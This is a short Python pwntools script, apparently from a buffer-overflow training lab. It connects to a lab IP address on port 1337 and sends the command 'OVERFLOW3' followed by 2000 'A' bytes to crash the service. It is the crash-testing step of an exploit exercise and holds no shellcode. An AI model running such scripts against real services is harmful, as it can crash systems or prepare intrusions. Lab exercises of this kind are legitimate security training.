#!/usr/bin/env python3

from pwn import *

host = "10.10.249.243"
port = 1337

s = remote(host, port)
total_length = 2000

payload = [
    b"OVERFLOW3 ",
    b"A" * total_length,

]

payload = b"".join(payload)
s.send(payload)
s.close()